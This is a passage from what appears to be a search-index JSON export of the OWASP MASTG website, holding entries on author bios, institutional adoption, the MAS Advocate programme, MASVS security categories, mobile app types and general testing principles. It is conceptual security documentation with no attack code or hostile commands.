thesis on Android security, Jeroen has been interested in mobile devices and their (in)security. He loves sharing his knowledge with other people, as is demonstrated by his many talks &amp; trainings at colleges, universities, clients and conferences.</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#vikas-gupta","title":"Vikas Gupta","text":"<p>Vikas is an experienced cyber security researcher, with expertise in mobile security. In his career he has worked to secure applications for various industries including fintech, banks and governments. He enjoys reverse engineering, especially obfuscated native code and cryptography. He holds masters in security and mobile computing, and an OSCP certification. He is always open to share his knowledge and exchange ideas.</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#changelog","title":"Changelog","text":"<p>All our Changelogs are available online at the OWASP MASTG GitHub repository, see the Releases page:</p> <p>https://github.com/OWASP/mastg/releases</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#disclaimer","title":"Disclaimer","text":"<p>Please consult the laws in your country before executing any tests against mobile apps by utilizing the MASTG materials. Refrain from violating the laws with anything described in the MASTG.</p> <p>Our Code of Conduct has further details.</p> <p>OWASP thanks the many authors, reviewers, and editors for their hard work in developing this guide. If you have any comments or suggestions, please connect with us: https://mas.owasp.org/contact</p> <p>If you find any inconsistencies or typos please open an issue in the OWASP MASTG Github Repo: https://github.com/OWASP/mastg</p>","tags":[]},{"location":"MASTG/0x02a-Frontispiece/#copyright-and-license","title":"Copyright and License","text":"<p>Copyright \u00a9 The OWASP Foundation. This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License. For any reuse or distribution, you must make clear to others the license terms of this work.</p> <p></p>","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/","title":"OWASP MASVS and MASTG Adoption","text":"<p>The OWASP MASVS and MASTG are trusted by the following platform providers and standardization, governmental and educational institutions.</p>","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#mobile-platform-providers","title":"Mobile Platform Providers","text":"","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#google-android","title":"Google Android","text":"<p>Since 2021 Google has shown their support for the OWASP Mobile Security project (MASTG/MASVS) and has started providing continuous and high value feedback to the MASVS refactoring process via the App Defense Alliance (ADA) and its MASA (Mobile Application Security Assessment) program.</p> <p>With MASA, Google has acknowledged the importance of leveraging a globally recognized standard for mobile app security to the mobile app ecosystem. Developers can work directly with an Authorized Lab partner to initiate a security assessment. Google will recognize developers who have had their applications independently validated against a set of MASVS Level 1 requirements and will showcase this on their Data safety section.</p> <p>We thank Google, the ADA and all its members for their support and for their excellent work on protecting the mobile app ecosystem.</p>","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#certification-institutions","title":"Certification Institutions","text":"","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#crest","title":"CREST","text":"<p>CREST is an international not-for-profit, membership body who quality assures its members and delivers professional certifications to the cyber security industry. CREST works with governments, regulators, academe, training partners, professional bodies and other stakeholders around the world.</p> <p>In August 2022, CREST launched the OWASP Verification Standard (OVS) Programme. CREST OVS sets new standards for application security. Underpinned by OWASP's Application Security Verification Standard (ASVS) and Mobile Application Security Verification Standard (MASVS), CREST is leveraging the open-source community to build and maintain global standards to deliver a global web and mobile application security framework. This will provide assurance to the buying community that developers using CREST OVS accredited providers, always know that they are engaged with ethical and capable organisations with skilled and competent security testers by leveraging the OWASP ASVS and MASVS standards.</p> <ul> <li>CREST OVS Programme</li> <li>CREST OVS Accreditation Process</li> <li>CREST OVS Introductory Video</li> </ul> <p>We thank CREST for their consulation regarding the OVS programme and its support to the open-source community to build and maintain global cyber security standards.</p>","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#standardization-institutions","title":"Standardization Institutions","text":"","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#nist-national-institute-of-standards-and-technology-united-states","title":"NIST (National Institute of Standards and Technology, United States)","text":"<p>The National Institute of Standards and Technology (NIST) was founded in 1901 and is now part of the U.S. Department of Commerce. NIST is one of the nation's oldest physical science laboratories. Congress established the agency to remove a major challenge to U.S. industrial competitiveness at the time \u2014 a second-rate measurement infrastructure that lagged behind the capabilities of the United Kingdom, Germany and other economic rivals.</p> <ul> <li>NIST.SP.800-163 \"Vetting the Security of Mobile Applications\" Revision 1, 2019</li> <li>NIST.SP.800-218 \"Secure Software Development Framework (SSDF) v1.1: Recommendations for Mitigating the Risk of Software Vulnerabilities\" v1.1, 2022</li> <li>NIST CSWP 33 \"Product Development Cybersecurity Handbook: Concepts and Considerations for IoT Product Manufacturers\" Initial Public Draft, 2024</li> </ul>","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#bsi-bundesamt-fur-sicherheit-in-der-informationstechnik-germany","title":"BSI (Bundesamt f\u00fcr Sicherheit in der Informationstechnik, Germany)","text":"<p>BSI stands for \"Federal Office for Information Security\", it has the goal to promote IT security in Germany and is the central IT security service provider for the federal government.</p> <ul> <li>Technical Guideline BSI TR-03161 Security requirements for eHealth applications v1.0, 2020</li> <li>Pr\u00fcfvorschrift f\u00fcr den Produktgutachter des \u201eePA-Frontend des Versicherten\" und des \u201eE-Rezept-Frontend des Versicherten v2.0, 2021</li> </ul>","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#ioxt","title":"ioXt","text":"<p>The mission of the ioXt Alliance is to build confidence in Internet of Things products through multi-stakeholder, international, harmonized, and standardized security and privacy requirements, product compliance programs, and public transparency of those requirements and programs.</p> <p>In 2021, ioXt has extended its security principles through the Mobile Application profile, so that app developers can ensure their products are built with, and maintain, high cybersecurity standards such as the OWASP MASVS and the VPN Trust Initiative. The ioXt Mobile Application profile is a security standard that applies to any cloud connected mobile app and provides the much needed market transparency for consumer and commercial mobile app security.</p> <ul> <li>ioXt Base Profile v2.0</li> </ul>","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#governmental-institutions","title":"Governmental Institutions","text":"Name Document Year Government of Singapore, Cyber Security Agency (CSA) Safe App Standard v2.0 2024 European Payments Council Payment Threats and Fraud Trends Report 2021 European Payments Council Mobile Initiated SEPA Credit Transfer Interoperability Implementation Guidelines, including SCT Instant (MSCT IIGs) 2019 ENISA (European Union Agency for Cybersecurity) Good Practices for Security of SMART CARS 2019 Government of India, Ministry of Electronics &amp; Information Technology Adoption of Mobile AppSec Verification Standard (MASVS) Version 1.0 of OWASP 2019 Finish Transport and Communication Agency (TRAFICOM) Assessment guideline for electronic identification services (Draft) 2019 Gobierno de Espa\u00f1a INCIBE Ciberseguridad en Smart Toys 2019","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#educational-institutions","title":"Educational Institutions","text":"Name Document Year Leibniz Fachhochschule Hannover, Germany Sicherheits\u00fcberpr\u00fcfung von mobilen iOS Apps nach OWASP (German) 2022 University of Florida, Florida Institute for Cybersecurity Research, United States \"SO{U}RCERER : Developer-Driven Security Testing Framework for Android Apps\" 2021 University of Adelaide, Australia and Queen Mary University of London, United Kingdom An Empirical Assessment of Global COVID-19 Contact Tracing Applications 2021 School of Information Technology, Map\u00faa University, Philippines A Vulnerability Assessment on the Parental Control Mobile Applications Security: Status based on the OWASP Security Requirements 2021","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#application-in-scientific-research","title":"Application in Scientific Research","text":"<ul> <li>STAMBA: Security Testing for Android Mobile Banking Apps</li> </ul>","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#books","title":"Books","text":"<ul> <li>Hands-On Security in DevOps</li> </ul>","tags":[]},{"location":"MASTG/0x02b-MASVS-MASTG-Adoption/#industry-case-studies","title":"Industry Case Studies","text":"<ul> <li>Case Study: NowSecure Commits to Security Standards</li> </ul> <p>Would you like to contribute with your case study? Connect with us!</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/","title":"Acknowledgments","text":"","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#contributors","title":"Contributors","text":"<p>All of our contributors are listed in the Contributing section of the OWASP MAS website:</p> <p>https://mas.owasp.org/contributing/</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#mas-advocates","title":"MAS Advocates","text":"<p>Being a \"MAS Advocate\" is the highest status that companies can achieve in the OWASP MAS project, acknowledging that they've gone above and beyond, continuously supporting the project with time/dedicated resources with clear/high impact.</p> <p>To achieve this status, you'll need to demonstrate that you make consistent high-impact contributions to the project. The minimum meaningful monthly contribution is the following:</p> <ul> <li>1 substantial PR, which includes a full set of Weakness+Tests+Demos<ul> <li>Alternatively, as this is currently a priority, several PRs focused on porting v1-&gt;v2 tests (equivalent effort to the above, must include at least one demo per test).</li> </ul> </li> <li>2-3 in-depth PR reviews or issue support<ul> <li>Involving a thorough analysis, constructive feedback, and actionable suggestions that demonstrate a clear understanding of the topic.</li> <li>Reviews should go beyond surface-level comments and, where necessary, include research to provide well-informed insights.</li> </ul> </li> <li>Active participation in the MAS Task Force, which includes:<ul> <li>Presenting your work, asking questions, and discussing new ideas/changes.</li> <li>Proactive follow-up on tasks and initiatives.</li> </ul> </li> </ul> <p>Important Note: Contributions should align with OWASP quality guidelines and project priorities.</p> <p>Initial evaluation period: Consistency over a sustained period of time (min. 6 months) is fundamental. Note that the 6-month timeframe is a minimum and may extend depending on the nature and impact of your contributions.</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#benefits","title":"Benefits","text":"<ul> <li>Company logo displayed in our main READMEs and main OWASP project site.</li> <li>Special acknowledgement on each MASTG release containing the contributed PRs.</li> </ul>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#how-to-apply","title":"How to Apply","text":"<p>If you'd like to apply please contact the project leaders by sending an email to Sven Schleier and Carlos Holguera who will validate your application and provide you with a contribution report.</p> <p>After the initial evaluation period (see above), you'll need to send back the contribution report including sufficient evidence (e.g links to PRs) showing what you've done in that period that goes inline with \"the minimum meaningful monthly contributions\".</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#important-disclaimers","title":"Important Disclaimers","text":"","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#renewals","title":"Renewals","text":"<p>If the MAS Advocate status is granted and you wish to maintain it, contributions must remain consistent beyond the initial evaluation period. Advocates must continue collecting evidence and submit a yearly contribution report.</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#financial-donations","title":"Financial Donations","text":"<p>Financial donations are not part of the eligibility criteria for MAS Advocate status.</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#non-endorsement","title":"Non-Endorsement","text":"<p>Advocate companies may use the OWASP MAS logo and reference MASVS/MASTG resources in their communications. However, they cannot present this as an endorsement by OWASP or imply that they are a preferred provider of software or services.</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#revocation-of-mas-advocate-status","title":"Revocation of MAS Advocate Status","text":"<p>MAS Advocate status will be revoked immediately if a company fails to comply with the guidelines. For example:</p> <ul> <li>Acceptable Use: Listing MAS Advocate status on a website homepage, in \"About Company\" slides for sales presentations, or in sales collateral.</li> <li>Non-Compliant Use: Claiming OWASP certification, OWASP endorsement, or being a preferred vendor of OWASP or the MAS project.</li> </ul>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#non-certification-non-vetting-disclaimer","title":"Non-Certification &amp; Non-Vetting Disclaimer","text":"<p>OWASP does not certify, validate, or vet any vendors, software, or trust marks. Claims of MASVS/MASTG/MASWE compliance are not officially recognized by OWASP or the OWASP MAS project. Organizations should exercise caution when relying on such claims.</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#vendor-neutrality","title":"Vendor Neutrality","text":"<p>The OWASP Foundation is strictly vendor-neutral and does not endorse any of its supporters.</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#governance-and-editorial-independence","title":"Governance and Editorial Independence","text":"<p>MAS Advocates may contribute to discussions, provide feedback, and suggest improvements to the OWASP MAS resources. However, they do not have decision-making authority over the final content, which remains under the control of the OWASP MAS project leaders.</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#our-mas-advocates","title":"Our MAS Advocates","text":"","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#nowsecure","title":"NowSecure","text":"<p>We'd like to thank NowSecure for its exemplary contributions since 2022, which set a blueprint for other potential contributors wanting to push the project forward. Read more about their journey here.</p> <p>High-impact Contributions:</p> <ul> <li>Hundreds of pull requests and reviews, significantly enhancing MAS resources.</li> <li>Key role in rebranding the project from MSTG to OWASP MAS.</li> <li>Major contributions to MASVS v2.0.0, including feedback on abstraction and testing profiles.</li> <li>Contributions to the MASTG refactor, including modularizing the framework.</li> <li>Significant input in introducing MASVS-PRIVACY and MASWE.</li> <li>Leadership of the MAS Task Force, driving the roadmap forward.</li> <li>Support in developing MAS Test Apps for Android and iOS.</li> </ul> <p>A special mention goes to NowSecure's contributions during the OWASP Project Summit 2024, where they led the mobile app security track and reviewed numerous contributions, fostering collaboration and innovation.</p> <p>In the past, NowSecure has also contributed to the project and has donated the  Android UnCrackable L4.</p>","tags":[]},{"location":"MASTG/0x02c-Acknowledgements/#guardsquare","title":"Guardsquare","text":"<p>We'd like to thank Guardsquare for its outstanding contributions to the OWASP MAS project, culminating in achieving MAS Advocate status in 2025. Read more about their achievement here.</p> <p>High-impact Contributions:</p> <ul> <li>Active participation in the MAS Task Force, including monthly calls and proactive follow-ups.</li> <li>Numerous pull requests focused on porting v1 to v2 tests with demos.</li> <li>Peer reviews and actionable feedback to maintain MASTG quality.</li> </ul> <p>A special highlight was Guardsquare's significant contributions during the OWASP Project Summit in November 2024, where their team submitted the majority of the \\~40 pull requests created during the event.</p>","tags":[]},{"location":"MASTG/0x03-Overview/","title":"Introduction to the OWASP Mobile Application Security Project","text":"<p>New technology always introduces new security risks, and security concerns for mobile apps differ from traditional desktop software in important ways. While modern mobile operating systems tend to be more secure than traditional desktop operating systems, problems can still appear if developers don't carefully consider security during mobile app development. These security risks often go beyond the usual concerns with data storage, inter-app communication, proper usage of cryptographic APIs, and secure network communication.</p>","tags":[]},{"location":"MASTG/0x03-Overview/#how-to-use-the-mobile-application-security-project","title":"How to Use the Mobile Application Security Project","text":"<p>First, the Project recommends that your mobile app security strategies should be based on the OWASP Mobile Application Security Verification Standard (MASVS), which defines a mobile app security model and lists generic security requirements for mobile apps. MASVS is designed to be used by architects, developers, testers, security professionals, and consumers to define and understand the qualities of a secure mobile app. After you have determined how OWASP MASVS applies to your mobile app's security model, the Project suggests that you use the OWASP Mobile Application Security Testing Guide (MASTG). The Testing Guide maps to the same basic set of security requirements offered by the MASVS and depending on the context, they can be used individually or combined to achieve different objectives.</p> <p></p> <p>For example, the MASVS requirements can be used in an app's planning and architecture design stages while the checklist and testing guide may serve as a baseline for manual security testing or as a template for automated security tests during or after development. In the \"Mobile App Security Testing\" chapter we'll describe how you can apply the checklist and MASTG to a mobile app penetration test.</p>","tags":[]},{"location":"MASTG/0x03-Overview/#whats-covered-in-the-mobile-testing-guide","title":"What's Covered in the Mobile Testing Guide","text":"<p>Throughout this guide, we will focus on apps for Android and iOS running on smartphones. These platforms are currently dominating the market and also run on other device classes including tablets, smartwatches, smart TVs, automotive infotainment units, and other embedded systems. Even if these additional device classes are out of scope, you can still apply most of the knowledge and testing techniques described in this guide with some deviance depending on the target device.</p> <p>Given the vast amount of mobile app frameworks available it would be impossible to cover all of them exhaustively. Therefore, we focus on native apps on each operating system. However, the same techniques are also useful when dealing with web or hybrid apps (ultimately, no matter the framework, every app is based on native components).</p>","tags":[]},{"location":"MASTG/0x03-Overview/#navigating-the-owasp-mastg","title":"Navigating the OWASP MASTG","text":"<p>The MASTG contains descriptions of all requirements specified in the MASVS. The MASTG contains the following main sections:</p> <ol> <li> <p>The General Testing Guide contains a mobile app security testing methodology and general vulnerability analysis techniques as they apply to mobile app security. It also contains additional technical test cases that are OS-independent, such as authentication and session management, network communications, and cryptography.</p> </li> <li> <p>The Android Testing Guide covers mobile security testing for the Android platform, including security basics, security test cases, reverse engineering techniques and prevention, and tampering techniques and prevention.</p> </li> <li> <p>The iOS Testing Guide covers mobile security testing for the iOS platform, including an overview of the iOS OS, security testing, reverse engineering techniques and prevention, and tampering techniques and prevention.</p> </li> </ol>","tags":[]},{"location":"MASTG/0x03-Overview/#how-security-personnel-should-address-mobile-security-testing","title":"How Security Personnel Should Address Mobile Security Testing","text":"<p>Many mobile app penetration testers have a background in network and web app penetration testing, a quality that is valuable for mobile app testing. Almost every mobile app talks to a backend service, and those services are prone to the same types of attacks we are familiar with in web apps on desktop machines. Mobile apps have a smaller attack surface and therefore have more security against injection and similar attacks. Instead, the MASTG prioritizes data protection on the device and the network to increase mobile security.</p>","tags":[]},{"location":"MASTG/0x03-Overview/#owasp-masvs-overview-key-areas-in-mobile-application-security","title":"OWASP MASVS Overview: Key Areas in Mobile Application Security","text":"","tags":[]},{"location":"MASTG/0x03-Overview/#masvs-storage-data-storage-and-privacy","title":"MASVS-STORAGE: Data Storage and Privacy","text":"<p>The Standard is based on the principle that protecting sensitive data, such as user credentials and private information, is crucial to mobile security. If an app does not use operating system APIs properly, especially those that handle local storage or inter-process communication (IPC), the app could expose sensitive data to other apps running on the same device or may unintentionally leak data to cloud storage, backups, or the keyboard cache. And since mobile devices are more likely to be or lost or stolen, attackers can actually gain physical access to the device, which would make it easier to retrieve the data.</p> <p>Thus we must take extra care to protect stored user data in mobile apps. Some solutions may include appropriate key storage APIs and using hardware-backed security features (when available).</p> <p>Fragmentation is a problem we deal with especially on Android devices. Not every Android device offers hardware-backed secure storage, and many devices are running outdated versions of Android. For an app to be supported on these out-of-date devices, it would have to be created using an older version of Android's API which may lack important security features. For maximum security, the best choice is to create apps with the current API version even though that excludes some users.</p>","tags":[]},{"location":"MASTG/0x03-Overview/#masvs-crypto-cryptography","title":"MASVS-CRYPTO: Cryptography","text":"<p>Cryptography is an essential ingredient when it comes to protecting data stored on a mobile device. It is also an area where things can go horribly wrong, especially when standard conventions are not followed. It is essential to ensure that the application uses cryptography according to industry best practices, including the use of proven cryptographic libraries, a proper choice and configuration of cryptographic primitives as well as a suitable random number generator wherever randomness is required.</p>","tags":[]},{"location":"MASTG/0x03-Overview/#masvs-auth-authentication-and-authorization","title":"MASVS-AUTH: Authentication and Authorization","text":"<p>In most cases, sending users to log in to a remote service is an integral part of the overall mobile app architecture. Even though most of the authentication and authorization logic happens at the endpoint, there are also some implementation challenges on the mobile app side. Unlike web apps, mobile apps often store long-time session tokens that are unlocked with user-to-device authentication features such as fingerprint scanning. While this allows for a quicker login and better user experience (nobody likes to enter complex passwords), it also introduces additional complexity and room for error.</p> <p>Mobile app architectures also increasingly incorporate authorization frameworks (such as OAuth2) that delegate authentication to a separate service or outsource the authentication process to an authentication provider. Using OAuth2 allows the client-side authentication logic to be outsourced to other apps on the same device (e.g. the system browser). Security testers must know the advantages and disadvantages of different possible authorization frameworks and architectures.</p>","tags":[]},{"location":"MASTG/0x03-Overview/#masvs-network-network-communication","title":"MASVS-NETWORK: Network Communication","text":"<p>Mobile devices regularly connect to a variety of networks, including public Wi-Fi networks shared with other (potentially malicious) clients. This creates opportunities for a wide variety of network-based attacks ranging from simple to complicated and old to new. It's crucial to maintain the confidentiality and integrity of information exchanged between the mobile app and remote service endpoints. As a basic requirement, mobile apps must set up a secure, encrypted channel for network communication using the TLS protocol with appropriate settings.</p>","tags":[]},{"location":"MASTG/0x03-Overview/#masvs-platform-interaction-with-the-mobile-platform","title":"MASVS-PLATFORM: Interaction with the Mobile Platform","text":"<p>Mobile operating system architectures differ from classical desktop architectures in important ways. For example, all mobile operating systems implement app permission systems that regulate access to specific APIs. They also offer more (Android) or less rich (iOS) inter-process communication (IPC) facilities that enable apps to exchange signals and data. These platform-specific features come with their own set of pitfalls. For example, if IPC APIs are misused, sensitive data or functionality might be unintentionally exposed to other apps running on the device.</p>","tags":[]},{"location":"MASTG/0x03-Overview/#masvs-code-code-quality-and-exploit-mitigation","title":"MASVS-CODE: Code Quality and Exploit Mitigation","text":"<p>Traditional injection and memory management issues aren't often seen in mobile apps due to the smaller attack surface. Mobile apps mostly interact with the trusted backend service and the UI, so even if many buffer overflow vulnerabilities exist in the app, those vulnerabilities usually don't open up any useful attack vectors. The same applies to browser exploits such as cross-site scripting (XSS allows attackers to inject scripts into web pages) that are very prevalent in web apps. However, there are always exceptions. XSS is theoretically possible on mobile in some cases, but it's very rare to see XSS issues that an individual can exploit.</p> <p>This protection from injection and memory management issues doesn't mean that app developers can get away with writing sloppy code. Following security best practices results in hardened (secure) release builds that are resilient against tampering. Free security features offered by compilers and mobile SDKs help increase security and mitigate attacks.</p>","tags":[]},{"location":"MASTG/0x03-Overview/#masvs-resilience-anti-tampering-and-anti-reversing","title":"MASVS-RESILIENCE: Anti-Tampering and Anti-Reversing","text":"<p>There are three things you should never bring up in polite conversations: religion, politics, and code obfuscation. Many security experts dismiss client-side protections outright. However, software protection controls are widely used in the mobile app world, so security testers need ways to deal with these protections. We believe there's a benefit to client-side protections if they are employed with a clear purpose and realistic expectations in mind and aren't used to replace security controls.</p>","tags":[]},{"location":"MASTG/0x04a-Mobile-App-Taxonomy/","title":"Mobile Application Taxonomy","text":"<p>When we use the term \"mobile application\" or \"mobile app,\" we are referring to a self-contained computer program designed to execute on a mobile device. At the time of publication, the Android and iOS operating systems cumulatively comprise more than 99% of the mobile OS market share and mobile Internet usage has far surpassed desktop Internet usage. This means that mobile apps are the most widespread types of Internet-capable apps.</p> <p>Also, this guide uses the term \"app\" as a general term which refers to any kind of application that runs on a mobile OS. Usually, apps run directly on the platform for which they're designed, run on top of a smart device's mobile browser, or they use a mix of these two methods.</p> <p>In this chapter, will discuss the following types of apps:</p> <ul> <li>Native Apps</li> <li>Cross-platform Mobile Frameworks</li> <li>Web Apps</li> <li>Hybrid Apps</li> <li>Progressive Web Apps</li> </ul>","tags":[]},{"location":"MASTG/0x04a-Mobile-App-Taxonomy/#native-apps","title":"Native Apps","text":"<p>If a mobile app is developed with a Software Development Kit (SDK) for developing apps specific to a mobile OS, they are referred to as native to their OS. If we are discussing a native app, we presume it was implemented in a standard programming language for that mobile operating system - Objective-C or Swift for iOS, and Java or Kotlin for Android.</p> <p>Because they are designed for a specific OS with the tools meant for that OS, native apps have the capability to provide the fastest performance with the highest degree of reliability. They usually adhere to platform-specific design principles (e.g. the Android Design Principles), which usually leads to a more consistent user interface (UI) compared to hybrid or web apps. Due to their close integration with the operating system, native apps generally can directly access almost every component of the device (camera, sensors, hardware-backed key stores, etc.).</p> <p>However, since Android provides two development kits - the Android SDK and the Android NDK, there is some ambiguity to the term native apps for this platform. While the SDK (based on the Java and Kotlin programming language) is the default for developing apps, the platform's NDK (or Native Development Kit) is a C/C++ kit used for developing binary libraries that can directly access lower level APIs (such as OpenGL). These libraries can be included in regular apps built with the SDK. Therefore, we say that Android native apps (i.e. built with the SDK) may have native code built with the NDK.</p>","tags":[]},{"location":"MASTG/0x04a-Mobile-App-Taxonomy/#cross-platform-mobile-frameworks","title":"Cross-platform Mobile Frameworks","text":"<p>The most obvious disadvantage of native apps is that they are limited to one specific platform. If developers want to build their app for both Android and iOS, one needs to maintain two independent code bases, or introduce often complex development tools to port a single code base to two platforms.</p> <p>Here are some cross-platform mobile frameworks that allow developers to compile a single codebase for different targets, including both Android and iOS:</p> <ul> <li>Xamarin</li> <li>MAUI</li> <li>Flutter</li> <li>React Native</li> <li>Unity</li> </ul> <p>If an app is developed using these frameworks, the app will use the internal APIs native to each system and offer performance equivalent to native apps. Also, these apps can make use of all device capabilities, including the GPS, accelerometer, camera, the notification system, etc. Even though an app created using one of these frameworks is functionally equivalent to a true native app, they are typically not referred to as such. The term native app is used for apps created with the OS's native SDK, while apps created using one of these frameworks are typically called cross-platform apps.</p> <p>It's important to know when an app uses a cross-platform mobile framework, because they typically require specific tools to perform static or dynamic analysis. The actual application logic is typically located in framework-specific files inside the app, even though the app also contains the typical code that you would see in a native app. This native code is however usually only used to initialize the cross-platform framework, and provide bindings between the native system API and the framework SDK through so called platform-specific bindings.</p> <p>Although it is rare, apps can combine native code and cross-platform frameworks, or even multiple cross-platform frameworks, so it's important to identify all the used technologies to correctly cover the entire attack surface of the app.</p>","tags":[]},{"location":"MASTG/0x04a-Mobile-App-Taxonomy/#web-apps","title":"Web Apps","text":"<p>Mobile web apps (or simply, web apps) are websites designed to look and feel like a native app. These apps run in the device's browser and are usually developed in HTML5, much like a modern web page. Launcher icons may be used to parallel the same feel of accessing a native app; however, these icons are essentially the same as a browser bookmark, simply opening the default web browser to load the referenced web page.</p> <p>Because they run within the confines of a browser, web apps have limited integration with the general components of the device (i.e. they are \"sandboxed\") and their performance is usually inferior compared to native apps. Since developers usually target multiple platforms with a web app, their UIs generally do not follow the design principles of any specific platform. However, web apps are popular because developers can use a single code base to reduce development and maintenance costs and distribute updates without going through the platform-specific app stores. For example, a change to the HTML file for a web app can serve as viable, cross-platform update whereas an update to a store-based app requires considerably more effort.</p>","tags":[]},{"location":"MASTG/0x04a-Mobile-App-Taxonomy/#hybrid-apps","title":"Hybrid Apps","text":"<p>Hybrid apps are a specific type of cross-platform app which try to benefit from the best aspects of native and web apps. This type of app executes like a native app, but a majority of the processes rely on web technologies, meaning a portion of the app runs in an embedded web browser (commonly called \"WebView\"). As such, hybrid apps inherit both pros and cons of native and web apps. These apps can use a web-to-native abstraction layer to access to device capabilities that are not accessible to a pure web app. Depending on the framework used for development, a hybrid app code base can generate multiple apps that target different platforms and take advantage of UI elements that closely resemble a device's original platform.</p> <p>Here are some popular frameworks for developing hybrid apps:</p> <ul> <li>Apache Cordova</li> <li>Framework 7</li> <li>Ionic</li> <li>Native Script</li> <li>Onsen UI</li> <li>Sencha Ext JS</li> </ul>","tags":[]},{"location":"MASTG/0x04a-Mobile-App-Taxonomy/#progressive-web-apps","title":"Progressive Web Apps","text":"<p>Progressive web apps (PWAs) combine different open standards of the web offered by modern browsers to provide benefits of a rich mobile experience. A Web App Manifest, which is a simple JSON file, can be used to configure the behavior of the app after \"installation\". These apps load like regular web pages, but differ from usual web apps in several ways.</p> <p>For example, it's possible to work offline and access to mobile device hardware is possible, which has been a capacity that was only available to native apps. PWAs are supported by both Android and iOS, but not all hardware features are yet available. For example, Push Notifications, Face ID on iPhone X, or ARKit for augmented reality is not available yet on iOS.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/","title":"Mobile Application Security Testing","text":"<p>In the following sections we'll provide a brief overview of general security testing principles and key terminology. The concepts introduced are largely identical to those found in other types of penetration testing, so if you are an experienced tester you may be familiar with some of the content.</p> <p>Throughout the guide, we use \"mobile app security testing\" as a catchall phrase to refer to the evaluation of mobile app security via static and dynamic analysis. Terms such as \"mobile app penetration testing\" and \"mobile app security review\" are used somewhat inconsistently in the security industry, but these terms refer to roughly the same thing. A mobile app security test is usually part of a larger security assessment or penetration test that encompasses the client-server architecture and server-side APIs used by the mobile app.</p> <p>In this guide, we cover mobile app security testing in two contexts. The first is the \"classical\" security test completed near the end of the development life cycle. In this context, the tester accesses a nearly finished or production-ready version of the app, identifies security issues, and writes a (usually devastating) report. The other context is characterized by the implementation of requirements and the automation of security tests from the beginning of the software development life cycle onwards. The same basic requirements and test cases apply to both contexts, but the high-level method and the level of client interaction differ.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#principles-of-testing","title":"Principles of Testing","text":"","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#white-box-testing-versus-black-box-testing","title":"White-box Testing versus Black-box Testing","text":"<p>Let's start by defining the concepts:</p> <ul> <li>Black-box testing is conducted without the tester's having any information about the app being tested. This process is sometimes called \"zero-knowledge testing\". The main purpose of this test is allowing the tester to behave like a real attacker in the sense of exploring possible uses for publicly available and discoverable information.</li> <li>White-box testing (sometimes called \"full knowledge testing\") is the total opposite of black-box testing in the sense that the tester has full knowledge of the app. The knowledge may encompass source code, documentation, and diagrams. This approach allows much faster testing than black-box testing due to its transparency and with the additional knowledge gained a tester can build much more sophisticated and granular test cases.</li> <li>Gray-box testing is all testing that falls in between the two aforementioned testing types: some information is provided to the tester (usually credentials only), and other information is intended to be discovered. This type of testing is an interesting compromise in the number of test cases, the cost, the speed, and the scope of testing. Gray-box testing is the most common kind of testing in the security industry.</li> </ul> <p>We strongly advise that you request the source code so that you can use the testing time as efficiently as possible. The tester's code access obviously doesn't simulate an external attack, but it simplifies the identification of vulnerabilities by allowing the tester to verify every identified anomaly or suspicious behavior at the code level. A white-box test is the way to go if the app hasn't been tested before.</p> <p>Even though decompiling on Android is straightforward, the source code may be obfuscated, and de-obfuscating will be time-consuming. Time constraints are therefore another reason for the tester to have access to the source code.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#vulnerability-analysis","title":"Vulnerability Analysis","text":"<p>Vulnerability analysis is usually the process of looking for vulnerabilities in an app. Although this may be done manually, automated scanners are usually used to identify the main vulnerabilities. Static and dynamic analysis are types of vulnerability analysis.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#static-versus-dynamic-analysis","title":"Static versus Dynamic Analysis","text":"<p>Static Application Security Testing (SAST) involves examining an app's components without executing them, by analyzing the source code either manually or automatically. OWASP provides information about Static Code Analysis that may help you understand techniques, strengths, weaknesses, and limitations.</p> <p>Dynamic Application Security Testing (DAST) involves examining the app during runtime. This type of analysis can be manual or automatic. It usually doesn't provide the information that static analysis provides, but it is a good way to detect interesting elements (assets, features, entry points, etc.) from a user's point of view.</p> <p>Now that we have defined static and dynamic analysis, let's dive deeper.</p>","tags":[]},{"location":"MASTG/0x04b-Mobile-App-Security-Testing/#static-analysis","title":"Static Analysis","text":"<p>During static analysis, the mobile app's source code is reviewed to ensure appropriate implementation of security controls. In most cases, a hybrid automatic/manual approach is used. Automatic scans catch the 